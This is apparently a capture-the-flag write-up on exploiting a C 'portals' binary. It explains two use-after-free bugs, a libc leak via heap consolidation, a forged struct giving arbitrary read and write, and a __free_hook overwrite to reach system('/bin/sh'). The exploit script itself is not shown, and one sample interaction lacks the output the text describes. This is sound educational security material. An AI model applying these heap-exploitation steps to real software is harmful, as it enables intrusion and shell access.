# Preliminary steps

We've got an executable, ```portals```, and the build environment for its deployment, alongside with the C source code for the executable.

We start by making some basic checks on the executable:

```
$ file portals
portals: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d08962799c081eff8f5002dfe2094e3cbaaf88d0, for GNU/Linux 3.2.0, not stripped
```

```
$ checksec portals
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Now we know that it's a 64 bit executable, dynamically linked and with all protections enabled. <br>
In these cases, it's likely that we will craft an exploit which involves ```libc```, so it's useful to build the environment with Docker and take ```libc``` and ```ld``` from there. <br>
After having done it, it's possible to make the local executable use these libraries, by using ```patchelf```:

```
$ patchelf --set-interpreter ./ld-2.31.so --add-needed ./libc-2.31.so ./portals --output ./patchelf_portals
```

# Analysis
For the analysis, we mix reading the source code and interacting with the executable.

We're prompted with "What will you do?", so we read the source code to see what are the options, learning that they are:
- ```m```, to leave a message;
- ```o```, to open a "portal";
- ```c```, to close a portal;
- ```t```, to take a portal.

At this point, you may be wondering what is a portal. <br>
It is a struct defined like that:

{% highlight C %}
#define MAX_PORTALS 5

typedef struct TimePoint TimePoint;
struct TimePoint {
    unsigned long year;
    TimePoint* portals[MAX_PORTALS];
    size_t msgSize;
    char* msg;
};
{% endhighlight %}

A portal is a ```TimePoint```, which is the node of a N-ary tree. <br>
There are two global variables, ```root``` and ```now```; the former one is the pointer to the "active" node. <br>
When the program starts, it calls a ```prologue()``` function, which initializes ```root``` and ```now```:

{% highlight C %}
TimePoint* root;
TimePoint* now;

void prologue() {
    printf("Finally! I've done it! I've invented a portal gun that can open portals to other points in time!\n"
           "I sure hope I don't create any paradoxes on accident or anything...\n"
           "Let's try it out!!\n");

    root = (TimePoint*)calloc(1, sizeof(TimePoint));
    root->year = 2022;
    now = root;
}
{% endhighlight %}

After the prologue, there is an interactive menu. <br>
In this menu, at each iteration it is called a ```describe()``` function, before prompting for the option; this function prints the ```year``` field of ```now```, calls ```printMessage()``` and prints the ```year``` field of each direct child of ```now```. <br>
The ```printMessage()``` function prints ```now->msgSize``` bytes of the buffer pointed by ```now->msg```, only if ```now->msgSize``` is not zero; it prints using ```fwrite```.

This is a sample interaction:

```
$ ./patchelf_portals 
Finally! I've done it! I've invented a portal gun that can open portals to other points in time!
I sure hope I don't create any paradoxes on accident or anything...
Let's try it out!!

```

Note that we were able to open a portal back to the root from the root's child; we will understand this better, by delving into the options.

```m``` option calls ```leaveMessage()``` function, that, if ```now->msgSize``` is zero, asks for an integer ```N``` in input and sets ```now->msgSize``` equal to ```N*16```; in this case, it also calls ```malloc``` with that size and sets ```now->msg``` to the pointer returned by ```malloc```. At last, in both cases (```now->msgSize``` == 0, or not), it takes input from stdin in the buffer pointed by ```now->msg``` using ```fgets```:

{% highlight C %}
fgets(now->msg, now->msgSize, stdin);
{% endhighlight %}

The other three options (```o```, ```c```, ```t```) read up to 5 bytes from the input, and call ```atoi``` on these bytes, to use the result as ```year``` field used for portals.

```o``` option calls ```openPortal(year)```, which:
- checks if there is a free (NULL) slot in ```now->portals``` array, if not then return;
- calls ```isPortalLegal(year)``` to check if there is any direct child ```pt``` of ```now``` for which ```pt->year == year```, in that case return;
- calls ```search(root, year, start=1)``` to search recursively the portal ```pt``` for which ```pt->year == year```, in the whole tree; if it does NOT find it, then a new portal will be allocated using ```calloc``` and will become the new child, OTHERWISE the pointer returned by the search will become the new child. The ```start``` parameter is used to handle loops when there is a pointer to the ```root``` as child of a node, in which case the function returns NULL, but it doesn't handle the case of sub-loops.

Therefore, as we saw in the sample interaction, with the ```openPortal()``` it's possible to create loops in the tree, and it's possible to obtain arbitrary cross-references in the tree, including multiple references to the same node.

```c``` option calls ```closePortal(year)```, which looks for the portal with the corresponding year *only among the direct children of ```now```*; in case of match with a child ```pt = now->portals[i]```, it:
- checks if ```pt->msgSize > 0```, in that case it calls ```free(pt->msg)```, but *without NULLing the freed pointer*;
- calls ```free(pt)```, and sets ```now->portals[i] = NULL```.

Last, ```t``` option calls ```takePortal(year)```, which looks for the portal ```pt``` with the corresponding year among the direct children of ```now``` and, in case of match, sets ```now = pt```.

Note that there are two cases of **UAF** (use after free):
- Thanks to ```openPortal()```, it's possible to obtain multiple references to the same node (portal) N from different parents nodes A and B, then it's possible to free N using ```closePortal()``` from node A while keeping the reference to N in node B. From ```Ghidra``` we see that a portal takes 0x40 bytes of space, so it would be possible to replace the freed memory with a "fake portal" by using ```leaveMessage()``` and letting that function set ```now->msgSize``` equal to ```4 * 16``` ("first-fit behaviour").
- Moreover, if the "middle" area of the freed portal doesn't get corrupted after the ```free```, in that area there is still the ```msg``` field, which is affected by UAF, too; since it's used during ```describe()```, it's clear that navigating to a freed portal (which had a message left) using ```takePortal()``` will lead to reading freed memory: this can be useful for **leaks**.

# Exploitation
Let's suppose we already obtained the desired leak; what can we do after?

We can use the described "fake portal" technique. <br>
In fact, by setting ```now``` to the fake portal, the function ```describe()``` which gets called cyclically gives the possibility of performing arbitrary reads. Furthermore, with ```leaveMessage()```, after having initialized the fake portal with the desired ```msgSize``` different from 0 and with the target ```msg```, it's possible to perform arbitrary write.

In the preliminary phase, we extracted the ```libc``` from the docker to patch the binary; we saw that its version is ```2.31```, so it's possible to overwrite the ```__free_hook``` to redirect the execution flow.

At this point it could be useful to inspect the *one-gadgets* of the libc, but it's not necessary to use a one-gadget. <br>
In fact, when we close a portal, if a message was left in that portal, then that ```msg``` will be freed. <br>
So, it will be passed as parameter to the function called with the ```__free_hook```. The idea, then, is to overwrite the hook with the address of ```system()``` function in libc, then close a portal whose ```msg``` had been previously set to ```"/bin/sh\x00"```, so that the resulting call will be ```system("/bin/sh")```.

To craft the fake portal, we need to know the exact structure in memory of the ```TimePoint``` struct:

| Field		    |   Byte offset	 |  Length (bytes)  |
|:-------------:|:--------------:|:----------------:|
| year		    |	0			 |	8               |
| portals[]	    |	8			 |	40 (5 * 8)      |
| msgSize		|	48			 |	8               |
| msg			|	56			 |	8               |

Now, all we need is a libc leak. <br>
The approach of navigating to a freed portal which had a ```msg``` set (which was freed, too, but not set to NULL) and viewing the output of the ```describe()``` function works to get a heap leak. <br>
To obtain a libc leak by reading freed memory in the heap, we need to prepare the heap such that in the freed area there will be pointers to ```main_arena``` in libc.

Before delving into it, note that once we are in a corrupted portal, we can still "escape" from it by opening a portal to ```root``` and taking it.

By browsing many online resources, we learn that to get libc addresses in the heap, two conditions need to be met:
- there must be chunks going to **unsorted bin**;
- there must occur **heap consolidation**.

One way to meet these conditions is to allocate a "large" chunk (but not so large that it needs ```mmap``), a "little" chunk (but not a "fastbin", so it must be larger than 0x80), then free both of them and then allocate a chunk a little bit larger of both of them, so that the consolidation occurs.

We can achieve that by using ```leaveMessage()``` for allocation and ```closePortal()``` for de-allocation (we don't care about the ```free``` of the portal, since it goes in fastbin). <br>
So, recalling that ```leaveMessage()``` takes N as input and allocates a chunk of N*16 bytes, we can do the following:
1. Allocate a first portal and leave a message with N=1000.
2. Allocate a second portal and leave a message with N=10.
3. Allocate a third portal, and open a portal to the first portal from there.
4. Close first portal.
5. Close second portal.
6. In the third portal, leave a message with N=1100.

At this point, we have to navigate from the third portal to the freed first portal; the first portal's year will be corrupted, since it is at the beginning of the chunk, but with this sequence of operations it will have a value of 0, so it's possible to navigate to it from the third portal by calling ```takePortal(0)```. <br>
When in the freed first portal, ```describe()``` function will call ```printMessage()```, which in turn prints the freed memory pointed by ```msg```: in that memory, we have the libc leak.

It wasn't obvious to get there: the idea was to trigger the heap consolidation, then inspect the heap with ```gdb``` by using ```find``` command to search for libc addresses, and then following the tree structure in the heap to see how to leak that memory. From that, it was also possible to compute the offset of the libc leak to the libc base: 0x1ed2e0.

Now that we have all the pieces of the puzzle, it's possible to write a script to combine (1) the leak using UAF and heap consolidation and (2) the fake portal using UAF and first-fit.

There are many comments left in the script, so for more details just read the main function.
